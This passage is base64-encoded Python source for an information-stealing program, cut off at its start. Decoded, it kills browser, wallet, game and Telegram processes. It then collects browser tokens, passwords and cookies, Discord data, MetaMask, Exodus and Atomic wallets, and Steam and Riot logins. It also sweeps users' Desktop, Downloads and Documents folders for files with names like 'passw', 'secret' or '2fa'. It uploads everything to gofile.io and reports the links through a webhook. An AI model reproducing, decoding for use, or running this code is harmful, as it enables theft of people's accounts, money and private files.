NjEyNC8xMDUxNDkwMzIwOTIxMTQ1Mzg0Lzc4NjcxMzEwNjY1ODQ5MjQxNi53ZWJwIiwKICAgICAgICAiYXR0YWNobWVudHMiOiBbXQogICAgfQogICAgTDA0ZHVybDFiKGhvb2ssIGRhdGE9ZHVtcHMoZGF0YSkuZW5jb2RlKCksIGhlYWRlcnM9aGVhZGVycykKCgpkZWYgWmlwVGVsZWdyYW0ocGF0aCwgYXJnLCBwcm9jYyk6CiAgICBnbG9iYWwgT3RoZXJaaXAKICAgIHBhdGhDID0gcGF0aAogICAgbmFtZSA9IGFyZwogICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHBhdGhDKTogcmV0dXJuCiAgICBzdWJwcm9jZXNzLlBvcGVuKGYidGFza2tpbGwgL2ltIHtwcm9jY30gL3QgL2YgPm51bCAyPiYxIiwgc2hlbGw9VHJ1ZSkKCiAgICB6ZiA9IFppcEZpbGUoZiJ7cGF0aEN9L3tuYW1lfS56aXAiLCAidyIpCiAgICBmb3IgZmlsZSBpbiBvcy5saXN0ZGlyKHBhdGhDKToKICAgICAgICBpZiBub3QgIi56aXAiIGluIGZpbGUgYW5kIG5vdCAidGR1bW15IiBpbiBmaWxlIGFuZCBub3QgInVzZXJfZGF0YSIgaW4gZmlsZSBhbmQgbm90ICJ3ZWJ2aWV3IiBpbiBmaWxlOiAKICAgICAgICAgICAgemYud3JpdGUocGF0aEMgKyAiLyIgKyBmaWxlKQogICAgemYuY2xvc2UoKQoKICAgIGxuaWsgPSB1cGxvYWRUb0Fub25maWxlcyhmJ3twYXRoQ30ve25hbWV9LnppcCcpCiAgICAjbG5payA9ICJodHRwczovL2dvb2dsZS5jb20iCiAgICBvcy5yZW1vdmUoZiJ7cGF0aEN9L3tuYW1lfS56aXAiKQogICAgT3RoZXJaaXAuYXBwZW5kKFthcmcsIGxuaWtdKQoKZGVmIFoxcFRoMW5ncyhwYXRoLCBhcmcsIHByb2NjKToKICAgIHBhdGhDID0gcGF0aAogICAgbmFtZSA9IGFyZwogICAgZ2xvYmFsIFdhbGxldHNaaXAsIEdhbWluZ1ppcCwgT3RoZXJaaXAKICAgICMgc3VicHJvY2Vzcy5Qb3BlbihmInRhc2traWxsIC9pbSB7cHJvY2N9IC90IC9mIiwgc2hlbGw9VHJ1ZSkKICAgICMgb3Muc3lzdGVtKGYidGFza2tpbGwgL2ltIHtwcm9jY30gL3QgL2YiKQoKICAgIGlmICJua2JpaGZiZW9nYWVhb2VobGVmbmtvZGJlZmdwZ2tubiIgaW4gYXJnOgogICAgICAgIGJyb3dzZXIgPSBwYXRoLnNwbGl0KCJcXCIpWzRdLnNwbGl0KCIvIilbMV0ucmVwbGFjZSgnICcsICcnKQogICAgICAgIG5hbWUgPSBmIk1ldGFtYXNrX3ticm93c2VyfSIKICAgICAgICBwYXRoQyA9IHBhdGggKyBhcmcKICAgIAogICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHBhdGhDKTogcmV0dXJuCiAgICBzdWJwcm9jZXNzLlBvcGVuKGYidGFza2tpbGwgL2ltIHtwcm9jY30gL3QgL2YgPm51bCAyPiYxIiwgc2hlbGw9VHJ1ZSkKCiAgICBpZiAiV2FsbGV0IiBpbiBhcmcgb3IgIk5hdGlvbnNHbG9yeSIgaW4gYXJnOgogICAgICAgIGJyb3dzZXIgPSBwYXRoLnNwbGl0KCJcXCIpWzRdLnNwbGl0KCIvIilbMV0ucmVwbGFjZSgnICcsICcnKQogICAgICAgIG5hbWUgPSBmInticm93c2VyfSIKCiAgICBlbGlmICJTdGVhbSIgaW4gYXJnOgogICAgICAgIGlmIG5vdCBvcy5wYXRoLmlzZmlsZShmIntwYXRoQ30vbG9naW51c2Vycy52ZGYiKTogcmV0dXJuCiAgICAgICAgZiA9IG9wZW4oZiJ7cGF0aEN9L2xvZ2ludXNlcnMudmRmIiwgInIrIiwgZW5jb2Rpbmc9InV0ZjgiKQogICAgICAgIGRhdGEgPSBmLnJlYWRsaW5lcygpCiAgICAgICAgIyBwcmludChkYXRhKQogICAgICAgIGZvdW5kID0gRmFsc2UKICAgICAgICBmb3IgbCBpbiBkYXRhOgogICAgICAgICAgICBpZiAnUmVtZW1iZXJQYXNzd29yZCJcdFx0IjEiJyBpbiBsOgogICAgICAgICAgICAgICAgZm91bmQgPSBUcnVlCiAgICAgICAgaWYgZm91bmQgPT0gRmFsc2U6IHJldHVybgogICAgICAgIG5hbWUgPSBhcmcKCgogICAgemYgPSBaaXBGaWxlKGYie3BhdGhDfS97bmFtZX0uemlwIiwgInciKQogICAgZm9yIGZpbGUgaW4gb3MubGlzdGRpcihwYXRoQyk6CiAgICAgICAgaWYgbm90ICIuemlwIiBpbiBmaWxlOiB6Zi53cml0ZShwYXRoQyArICIvIiArIGZpbGUpCiAgICB6Zi5jbG9zZSgpCgogICAgbG5payA9IHVwbG9hZFRvQW5vbmZpbGVzKGYne3BhdGhDfS97bmFtZX0uemlwJykKICAgICNsbmlrID0gImh0dHBzOi8vZ29vZ2xlLmNvbSIKICAgIG9zLnJlbW92ZShmIntwYXRoQ30ve25hbWV9LnppcCIpCgogICAgaWYgIldhbGxldCIgaW4gYXJnIG9yICJlb2dhZWFvZWhsZWYiIGluIGFyZzoKICAgICAgICBXYWxsZXRzWmlwLmFwcGVuZChbbmFtZSwgbG5pa10pCiAgICBlbGlmICJOYXRpb25zR2xvcnkiIGluIG5hbWUgb3IgIlN0ZWFtIiBpbiBuYW1lIG9yICJSaW90Q2xpIiBpbiBuYW1lOgogICAgICAgIEdhbWluZ1ppcC5hcHBlbmQoW25hbWUsIGxuaWtdKQogICAgZWxzZToKICAgICAgICBPdGhlclppcC5hcHBlbmQoW25hbWUsIGxuaWtdKQoKCmRlZiBHYXRoZXJBbGwoKToKICAgICcgICAgICAgICAgICAgICAgICAgRGVmYXVsdCBQYXRoIDwgMCA+ICAgICAgICAgICAgICAgICAgICAgICAgIFByb2Nlc05hbWUgPCAxID4gICAgICAgIFRva2VuICA8IDIgPiAgICAgICAgICAgICAgUGFzc3dvcmQgPCAzID4gICAgIENvb2tpZXMgPCA0ID4gICAgICAgICAgICAgICAgICAgICAgICAgIEV4dGVudGlvbnMgPCA1ID4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJwogICAgYnJvd3NlclBhdGhzID0gWwogICAgICAgIFtmIntyb2FtaW5nfS9PcGVyYSBTb2Z0d2FyZS9PcGVyYSBHWCBTdGFibGUiLCAgICAgICAgICAgICAgICJvcGVyYS5leGUiLCAgICAiL0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICAgICAgICAgICAiLyIsICAgICAgICAgICAgIi9OZXR3b3JrIiwgICAgICAgICAgICAgIi9Mb2NhbCBFeHRlbnNpb24gU2V0dGluZ3MvbmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4iICAgICAgICAgICAgICAgICAgICAgIF0sCiAgICAgICAgW2Yie3JvYW1pbmd9L09wZXJhIFNvZnR3YXJlL09wZXJhIFN0YWJsZSIsICAgICAgICAgICAgICAgICAgIm9wZXJhLmV4ZSIsICAgICIvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIiwgICAgICAgICAgICIvIiwgICAgICAgICAgICAiL05ldHdvcmsiLCAgICAgICAgICAgICAiL0xvY2FsIEV4dGVuc2lvbiBTZXR0aW5ncy9ua2JpaGZiZW9nYWVhb2VobGVmbmtvZGJlZmdwZ2tubiIgICAgICAgICAgICAgICAgICAgICAgXSwKICAgICAgICBbZiJ7cm9hbWluZ30vT3BlcmEgU29mdHdhcmUvT3BlcmEgTmVvbi9Vc2VyIERhdGEvRGVmYXVsdCIsICAib3BlcmEuZXhlIiwgICAgIi9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiLCAgICAgICAgICAgIi8iLCAgICAgICAgICAgICIvTmV0d29yayIsICAgICAgICAgICAgICIvTG9jYWwgRXh0ZW5zaW9uIFNldHRpbmdzL25rYmloZmJlb2dhZWFvZWhsZWZua29kYmVmZ3Bna25uIiAgICAgICAgICAgICAgICAgICAgICBdLAogICAgICAgIFtmIntsb2NhbH0vR29vZ2xlL0Nocm9tZS9Vc2VyIERhdGEiLCAgICAgICAgICAgICAgICAgICAgICAgICJjaHJvbWUuZXhlIiwgICAiL0RlZmF1bHQvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIiwgICAiL0RlZmF1bHQiLCAgICAgIi9EZWZhdWx0L05ldHdvcmsiLCAgICAgIi9EZWZhdWx0L0xvY2FsIEV4dGVuc2lvbiBTZXR0aW5ncy9ua2JpaGZiZW9nYWVhb2VobGVmbmtvZGJlZmdwZ2tubiIgICAgICAgICAgICAgIF0sCiAgICAgICAgW2Yie2xvY2FsfS9Hb29nbGUvQ2hyb21lIFN4Uy9Vc2VyIERhdGEiLCAgICAgICAgICAgICAgICAgICAgImNocm9tZS5leGUiLCAgICIvRGVmYXVsdC9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiLCAgICIvRGVmYXVsdCIsICAgICAiL0RlZmF1bHQvTmV0d29yayIsICAgICAiL0RlZmF1bHQvTG9jYWwgRXh0ZW5zaW9uIFNldHRpbmdzL25rYmloZmJlb2dhZWFvZWhsZWZua29kYmVmZ3Bna25uIiAgICAgICAgICAgICAgXSwKICAgICAgICBbZiJ7bG9jYWx9L0JyYXZlU29mdHdhcmUvQnJhdmUtQnJvd3Nlci9Vc2VyIERhdGEiLCAgICAgICAgICAiYnJhdmUuZXhlIiwgICAgIi9EZWZhdWx0L0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICAgIi9EZWZhdWx0IiwgICAgICIvRGVmYXVsdC9OZXR3b3JrIiwgICAgICIvRGVmYXVsdC9Mb2NhbCBFeHRlbnNpb24gU2V0dGluZ3MvbmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4iICAgICAgICAgICAgICBdLAogICAgICAgIFtmIntsb2NhbH0vWWFuZGV4L1lhbmRleEJyb3dzZXIvVXNlciBEYXRhIiwgICAgICAgICAgICAgICAgICJ5YW5kZXguZXhlIiwgICAiL0RlZmF1bHQvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIiwgICAiL0RlZmF1bHQiLCAgICAgIi9EZWZhdWx0L05ldHdvcmsiLCAgICAgIi9Ib3VnYUJvdWdhL25rYmloZmJlb2dhZWFvZWhsZWZua29kYmVmZ3Bna25uIiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIF0sCiAgICAgICAgW2Yie2xvY2FsfS9NaWNyb3NvZnQvRWRnZS9Vc2VyIERhdGEiLCAgICAgICAgICAgICAgICAgICAgICAgImVkZ2UuZXhlIiwgICAgICIvRGVmYXVsdC9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiLCAgICIvRGVmYXVsdCIsICAgICAiL0RlZmF1bHQvTmV0d29yayIsICAgICAiL0RlZmF1bHQvTG9jYWwgRXh0ZW5zaW9uIFNldHRpbmdzL25rYmloZmJlb2dhZWFvZWhsZWZua29kYmVmZ3Bna25uIiAgICAgICAgICAgICAgXQogICAgXQoKICAgIGRpc2NvcmRQYXRocyA9IFsKICAgICAgICBbZiJ7cm9hbWluZ30vRGlzY29yZCIsICIvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIl0sCiAgICAgICAgW2Yie3JvYW1pbmd9L0xpZ2h0Y29yZCIsICIvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIl0sCiAgICAgICAgW2Yie3JvYW1pbmd9L2Rpc2NvcmRjYW5hcnkiLCAiL0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiJdLAogICAgICAgIFtmIntyb2FtaW5nfS9kaXNjb3JkcHRiIiwgIi9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiXSwKICAgIF0KCiAgICBQYXRoc1RvWmlwID0gWwogICAgICAgIFtmIntyb2FtaW5nfS9hdG9taWMvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIiwgJyJBdG9taWMgV2FsbGV0LmV4ZSInLCAiV2FsbGV0Il0sCiAgICAgICAgW2Yie3JvYW1pbmd9L0V4b2R1cy9leG9kdXMud2FsbGV0IiwgIkV4b2R1cy5leGUiLCAiV2FsbGV0Il0sCiAgICAgICAgWyJDOlxQcm9ncmFtIEZpbGVzICh4ODYpXFN0ZWFtXGNvbmZpZyIsICJzdGVhbS5leGUiLCAiU3RlYW0iXSwKICAgICAgICBbZiJ7cm9hbWluZ30vTmF0aW9uc0dsb3J5L0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICJOYXRpb25zR2xvcnkuZXhlIiwgIk5hdGlvbnNHbG9yeSJdLAogICAgICAgIFtmIntsb2NhbH0vUmlvdCBHYW1lcy9SaW90IENsaWVudC9EYXRhIiwgIlJpb3RDbGllbnRTZXJ2aWNlcy5leGUiLCAiUmlvdENsaWVudCJdCiAgICBdCiAgICBUZWxlZ3JhbSA9IFtmIntyb2FtaW5nfS9UZWxlZ3JhbSBEZXNrdG9wL3RkYXRhIiwgJ3RlbGVncmFtLmV4ZScsICJUZWxlZ3JhbSJdCgogICAgZm9yIHBhdHQgaW4gYnJvd3NlclBhdGhzOiAKICAgICAgICBhID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9Z2V0VDBrM24sIGFyZ3M9W3BhdHRbMF0sIHBhdHRbMl1dKQogICAgICAgIGEuc3RhcnQoKQogICAgICAgIFRocmVhZGxpc3QuYXBwZW5kKGEpCiAgICBmb3IgcGF0dCBpbiBkaXNjb3JkUGF0aHM6IAogICAgICAgIGEgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1HM3REMXNjMHJkLCBhcmdzPVtwYXR0WzBdLCBwYXR0WzFdXSkKICAgICAgICBhLnN0YXJ0KCkKICAgICAgICBUaHJlYWRsaXN0LmFwcGVuZChhKQoKICAgIGZvciBwYXR0IGluIGJyb3dzZXJQYXRoczogCiAgICAgICAgYSA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PWdldFA0c3N3LCBhcmdzPVtwYXR0WzBdLCBwYXR0WzNdXSkKICAgICAgICBhLnN0YXJ0KCkKICAgICAgICBUaHJlYWRsaXN0LmFwcGVuZChhKQoKICAgIFRoQ29rayA9IFtdCiAgICBmb3IgcGF0dCBpbiBicm93c2VyUGF0aHM6IAogICAgICAgIGEgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1nZXRDMDBrMTMsIGFyZ3M9W3BhdHRbMF0sIHBhdHRbNF1dKQogICAgICAgIGEuc3RhcnQoKQogICAgICAgIFRoQ29ray5hcHBlbmQoYSkKCiAgICB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1HYXRoZXJaaXBzLCBhcmdzPVticm93c2VyUGF0aHMsIFBhdGhzVG9aaXAsIFRlbGVncmFtXSkuc3RhcnQoKQoKCiAgICBmb3IgdGhyZWFkIGluIFRoQ29razogdGhyZWFkLmpvaW4oKQogICAgREVURUNURUQgPSBUUjZzdChDMDBrMTMpCiAgICBpZiBERVRFQ1RFRCA9PSBUcnVlOiByZXR1cm4KCiAgICBmb3IgcGF0dCBpbiBicm93c2VyUGF0aHM6CiAgICAgICAgIHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PVoxcFRoMW5ncywgYXJncz1bcGF0dFswXSwgcGF0dFs1XSwgcGF0dFsxXV0pLnN0YXJ0KCkKICAgIAogICAgZm9yIHBhdHQgaW4gUGF0aHNUb1ppcDoKICAgICAgICAgdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9WjFwVGgxbmdzLCBhcmdzPVtwYXR0WzBdLCBwYXR0WzJdLCBwYXR0WzFdXSkuc3RhcnQoKQogICAgCiAgICB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1aaXBUZWxlZ3JhbSwgYXJncz1bVGVsZWdyYW1bMF0sIFRlbGVncmFtWzJdLCBUZWxlZ3JhbVsxXV0pLnN0YXJ0KCkKCiAgICBmb3IgdGhyZWFkIGluIFRocmVhZGxpc3Q6IAogICAgICAgIHRocmVhZC5qb2luKCkKICAgIGdsb2JhbCB1cHRocwogICAgdXB0aHMgPSBbXQoKICAgIGZvciBmaWxlIGluIFsid3BwYXNzdy50eHQiLCAid3Bjb29rLnR4dCJdOiAKICAgICAgICAjIHVwbG9hZChvcy5nZXRlbnYoIlRFTVAiKSArICJcXCIgKyBmaWxlKQogICAgICAgIHVwbG9hZChmaWxlLnJlcGxhY2UoIi50eHQiLCAiIiksIHVwbG9hZFRvQW5vbmZpbGVzKG9zLmdldGVudigiVEVNUCIpICsgIlxcIiArIGZpbGUpKQoKZGVmIHVwbG9hZFRvQW5vbmZpbGVzKHBhdGgpOgogICAgdHJ5OnJldHVybiByZXF1ZXN0cy5wb3N0KGYnaHR0cHM6Ly97cmVxdWVzdHMuZ2V0KCJodHRwczovL2FwaS5nb2ZpbGUuaW8vZ2V0U2VydmVyIikuanNvbigpWyJkYXRhIl1bInNlcnZlciJdfS5nb2ZpbGUuaW8vdXBsb2FkRmlsZScsIGZpbGVzPXsnZmlsZSc6IG9wZW4ocGF0aCwgJ3JiJyl9KS5qc29uKClbImRhdGEiXVsiZG93bmxvYWRQYWdlIl0KICAgIGV4Y2VwdDpyZXR1cm4gRmFsc2UKCiMgZGVmIHVwbG9hZFRvQW5vbmZpbGVzKHBhdGgpOnMKIyAgICAgdHJ5OgojICAgICAgICAgZmlsZXMgPSB7ICJmaWxlIjogKHBhdGgsIG9wZW4ocGF0aCwgbW9kZT0ncmInKSkgfQojICAgICAgICAgdXBsb2FkID0gcmVxdWVzdHMucG9zdCgiaHR0cHM6Ly90cmFuc2Zlci5zaC8iLCBmaWxlcz1maWxlcykKIyAgICAgICAgIHVybCA9IHVwbG9hZC50ZXh0CiMgICAgICAgICByZXR1cm4gdXJsCiMgICAgIGV4Y2VwdDoKIyAgICAgICAgIHJldHVybiBGYWxzZQoKZGVmIEtpd2lGb2xkZXIocGF0aEYsIGtleXdvcmRzKToKICAgIGdsb2JhbCBLaXdpRmlsZXMKICAgIG1heGZpbGVzcGVyZGlyID0gNwogICAgaSA9IDAKICAgIGxpc3RPZkZpbGUgPSBvcy5saXN0ZGlyKHBhdGhGKQogICAgZmZvdW5kID0gW10KICAgIGZvciBmaWxlIGluIGxpc3RPZkZpbGU6CiAgICAgICAgaWYgbm90IG9zLnBhdGguaXNmaWxlKHBhdGhGICsgIi8iICsgZmlsZSk6IHJldHVybgogICAgICAgIGkgKz0gMQogICAgICAgIGlmIGkgPD0gbWF4ZmlsZXNwZXJkaXI6CiAgICAgICAgICAgIHVybCA9IHVwbG9hZFRvQW5vbmZpbGVzKHBhdGhGICsgIi8iICsgZmlsZSkKICAgICAgICAgICAgZmZvdW5kLmFwcGVuZChbcGF0aEYgKyAiLyIgKyBmaWxlLCB1cmxdKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIGJyZWFrCiAgICBLaXdpRmlsZXMuYXBwZW5kKFsiZm9sZGVyIiwgcGF0aEYgKyAiLyIsIGZmb3VuZF0pCgpLaXdpRmlsZXMgPSBbXQpkZWYgS2l3aUZpbGUocGF0aCwga2V5d29yZHMpOgogICAgZ2xvYmFsIEtpd2lGaWxlcwogICAgZmlmb3VuZCA9IFtdCiAgICBsaXN0T2ZGaWxlID0gb3MubGlzdGRpcihwYXRoKQogICAgZm9yIGZpbGUgaW4gbGlzdE9mRmlsZToKICAgICAgICBmb3Igd29yZiBpbiBrZXl3b3JkczoKICAgICAgICAgICAgaWYgd29yZiBpbiBmaWxlLmxvd2VyKCk6CiAgICAgICAgICAgICAgICBpZiBvcy5wYXRoLmlzZmlsZShwYXRoICsgIi8iICsgZmlsZSkgYW5kICIudHh0IiBpbiBmaWxlOgogICAgICAgICAgICAgICAgICAgIGZpZm91bmQuYXBwZW5kKFtwYXRoICsgIi8iICsgZmlsZSwgdXBsb2FkVG9Bbm9uZmlsZXMocGF0aCArICIvIiArIGZpbGUpXSkKICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgaWYgb3MucGF0aC5pc2RpcihwYXRoICsgIi8iICsgZmlsZSk6CiAgICAgICAgICAgICAgICAgICAgdGFyZ2V0ID0gcGF0aCArICIvIiArIGZpbGUKICAgICAgICAgICAgICAgICAgICBLaXdpRm9sZGVyKHRhcmdldCwga2V5d29yZHMpCiAgICAgICAgICAgICAgICAgICAgYnJlYWsKCiAgICBLaXdpRmlsZXMuYXBwZW5kKFsiZm9sZGVyIiwgcGF0aCwgZmlmb3VuZF0pCgpkZWYgS2l3aSgpOgogICAgdXNlciA9IHRlbXAuc3BsaXQoIlxBcHBEYXRhIilbMF0KICAgIHBhdGgyc2VhcmNoID0gWwogICAgICAgIHVzZXIgKyAiL0Rlc2t0b3AiLAogICAgICAgIHVzZXIgKyAiL0Rvd25sb2FkcyIsCiAgICAgICAgdXNlciArICIvRG9jdW1lbnRzIgogICAgXQoKICAgIGtleV93b3Jkc0ZvbGRlciA9IFsKICAgICAgICAiYWNjb3VudCIsCiAgICAgICAgImFjb3VudCIsCiAgICAgICAgInBhc3N3IiwKICAgICAgICAic2VjcmV0IiwKICAgICAgICAic2VuaGFzIiwKICAgICAgICAiY29udGFzIiwKICAgICAgICAiYmFja3VwIiwKICAgICAgICAiMmZhIiwKICAgICAgICAiaW1wb3J0YW50ZSIsCiAgICAgICAgInByaXZhZG8iLAogICAgICAgICJleG9kdXMiLAogICAgICAgICJleHBvc2VkIiwKICAgICAgICAicGVyZGVyIiwKICAgICAgICAiYW1pZ29zIiwKICAgICAgICAiZW1wcmVzYSIsCiAgICAgICAgInRyYWJhbGhvIiwKICAgICAgICAid29yayIsCiAgICAgICAgInByaXZhdGUiLAogICAgICAgICJzb3VyY2UiLAogICAgICAgICJ1c2VycyIsCiAgICAgICAgInVzZXJuYW1lIiwKICAgICAgICAibG9naW4iLAogICAgICAgICJ1c2VyIiwKICAgICAgICAidXN1YXJpbyIsCiAgICAgICAgImxvZyIKICAgIF0KCiAgICBrZXlfd29yZHNGaWxlcyA9IFsKICAgICAgICAicGFzc3ciLAogICAgICAgICJtZHAiLAogICAgICAgICJtb3RkZXBhc3NlIiwKICAgICAgICAibW90X2RlX3Bhc3NlIiwKICAgICAgICAibG9naW4iLAogICAgICAgICJzZWNyZXQiLAogICAgICAgICJhY2NvdW50IiwKICAgICAgICAiYWNvdW50IiwKICAgICAgICAicGF5cGFsIiwKICAgICAgICAiYmFucXVlIiwKICAgICAgICAiYWNjb3VudCIsICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICJtZXRhbWFzayIsCiAgICAgICAgIndhbGxldCIsCiAgICAgICAgImNyeXB0byIsCiAgICAgICAgImV4b2R1cyIsCiAgICAgICAgImRpc2NvcmQiLAogICAgICAgICIyZmEiLAogICAgICAgICJjb2RlIiwKICAgICAgICAibWVtbyIsCiAgICAgICAgImNvbXB0ZSIsCiAgICAgICAgInRva2VuIiwKICAgICAgICAiYmFja3VwIiwKICAgICAgICAic2VjcmV0IiwKICAgICAgICAibW9tIiwKICAgICAgICAiZmFtaWx5IgogICAgICAgIF0KCiAgICB3aWtpdGggPSBbXQogICAgZm9yIHBhdHQgaW4gcGF0aDJzZWFyY2g6IAogICAgICAgIGtpd2kgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1LaXdpRmlsZSwgYXJncz1bcGF0dCwga2V5X3dvcmRzRmlsZXNdKTtraXdpLnN0YXJ0KCkKICAgICAgICB3aWtpdGguYXBwZW5kKGtpd2kpCiAgICByZXR1cm4gd2lraXRoCgoKZ2xvYmFsIGtleXdvcmQsIGNvb2tpV29yZHMsIHBhc3dXb3JkcywgQ29va2lDb3VudCwgUDRzc3dDb3VudCwgV2FsbGV0c1ppcCwgR2FtaW5nWmlwLCBPdGhlclppcAoKa2V5d29yZCA9IFsKICAgICdtYWlsJywgJ1tjb2luYmFzZV0oaHR0cHM6Ly9jb2luYmFzZS5jb20pJywgJ1tzZWxsaXhdKGh0dHBzOi8vc2VsbGl4LmlvKScsICdbZ21haWxdKGh0dHBzOi8vZ21haWwuY29tKScsICdbc3RlYW1dKGh0dHBzOi8vc3RlYW0uY29tKScsICdbZGlzY29yZF0oaHR0cHM6Ly9kaXNjb3JkLmNvbSknLCAnW3Jpb3RnYW1lc10oaHR0cHM6Ly9yaW90Z2FtZXMuY29tKScsICdbeW91dHViZV0oaHR0cHM6Ly95b3V0dWJlLmNvbSknLCAnW2luc3RhZ3JhbV0oaHR0cHM6Ly9pbnN0YWdyYW0uY29tKScsICdbdGlrdG9rXShodHRwczovL3Rpa3Rvay5jb20pJywgJ1t0d2l0dGVyXShodHRwczovL3R3aXR0ZXIuY29tKScsICdbZmFjZWJvb2tdKGh0dHBzOi8vZmFjZWJvb2suY29tKScsICdjYXJkJywgJ1tlcGljZ2FtZXNdKGh0dHBzOi8vZXBpY2dhbWVzLmNvbSknLCAnW3Nwb3RpZnldKGh0dHBzOi8vc3BvdGlmeS5jb20pJywgJ1t5YWhvb10oaHR0cHM6Ly95YWhvby5jb20pJywgJ1tyb2Jsb3hdKGh0dHBzOi8vcm9ibG94LmNvbSknLCAnW3R3aXRjaF0oaHR0cHM6Ly90d2l0Y2guY29tKScsICdbbWluZWNyYWZ0XShodHRwczovL21pbmVjcmFmdC5uZXQpJywgJ2JhbmsnLCAnW3BheXBhbF0oaHR0cHM6Ly9wYXlwYWwuY29tKScsICdbb3JpZ2luXShodHRwczovL29yaWdpbi5jb20pJywgJ1thbWF6b25dKGh0dHBzOi8vYW1hem9uLmNvbSknLCAnW2ViYXldKGh0dHBzOi8vZWJheS5jb20pJywgJ1thbGlleHByZXNzXShodHRwczovL2FsaWV4cHJlc3MuY29tKScsICdbcGxheXN0YXRpb25dKGh0dHBzOi8vcGxheXN0YXRpb24uY29tKScsICdbaGJvXShodHRwczovL2hiby5jb20pJywgJ1t4Ym94XShodHRwczovL3hib3guY29tKScsICdidXknLCAnc2VsbCcsICdbYmluYW5jZV0oaHR0cHM6Ly9iaW5hbmNlLmNvbSknLCAnW2hvdG1haWxdKGh0dHBzOi8vaG90bWFpbC5jb20pJywgJ1tvdXRsb29rXShodHRwczovL291dGxvb2suY29tKScsICdbY3J1bmNoeXJvbGxdKGh0dHBzOi8vY3J1bmNoeXJvbGwuY29tKScsICdbdGVsZWdyYW1dKGh0dHBzOi8vdGVsZWdyYW0uY29tKScsICdbcG9ybmh1Yl0oaHR0cHM6Ly9wb3JuaHViLmNvbSknLCAnW2Rpc25leV0oaHR0cHM6Ly9kaXNuZXkuY29tKScsICdbZXhwcmVzc3Zwbl0oaHR0cHM6Ly9leHByZXNzdnBuLmNvbSknLCAnY3J5cHRvJywgJ1t1YmVyXShodHRwczovL3ViZXIuY29tKScsICdbbmV0ZmxpeF0oaHR0cHM6Ly9uZXRmbGl4LmNvbSknCl0KCkNvb2tpQ291bnQsIFA0c3N3Q291bnQgPSAwLCAwCmNvb2tpV29yZHMgPSBbXQpwYXN3V29yZHMgPSBbXQoKV2FsbGV0c1ppcCA9IFtdICMgW05hbWUsIExpbmtdCkdhbWluZ1ppcCA9IFtdCk90aGVyWmlwID0gW10KCkdhdGhlckFsbCgpCkRFVEVDVEVEID0gVFI2c3QoQzAwazEzKQojIERFVEVDVEVEID0gRmFsc2UKaWYgbm90IERFVEVDVEVEOgogICAgd2lraXRoID0gS2l3aSgpCgogICAgZm9yIHRocmVhZCBpbiB3aWtpdGg6IHRocmVhZC5qb2luKCkKICAgIHRpbWUuc2xlZXAoMC4yKQoKICAgIGZpbGV0ZXh0ID0gIlxuIgogICAgZm9yIGFyZyBpbiBLaXdpRmlsZXM6CiAgICAgICAgaWYgbGVuKGFyZ1syXSkgIT0gMDoKICAgICAgICAgICAgZm9sZHBhdGggPSBhcmdbMV0KICAgICAgICAgICAgZm9sZGxpc3QgPSBhcmdbMl0gICAgICAgCiAgICAgICAgICAgIGZpbGV0ZXh0ICs9IGYi8J+TgSB7Zm9sZHBhdGh9XG4iCgogICAgICAgICAgICBmb3IgZmZpbCBpbiBmb2xkbGlzdDoKICAgICAgICAgICAgICAgIGEgPSBmZmlsWzBdLnNwbGl0KCIvIikKICAgICAgICAgICAgICAgIGZpbGVhbm1lID0gYVtsZW4oYSktMV0KICAgICAgICAgICAgICAgIGIgPSBmZmlsWzFdCiAgICAgICAgICAgICAgICBmaWxldGV4dCArPSBmIuKUlOKUgDpvcGVuX2ZpbGVfZm9sZGVyOiBbe2ZpbGVhbm1lfV0oe2J9KVxuIgogICAgICAgICAgICBmaWxldGV4dCArPSAiXG4iCiAgICB1cGxvYWQoImtpd2kiLCBmaWxldGV4dCk=
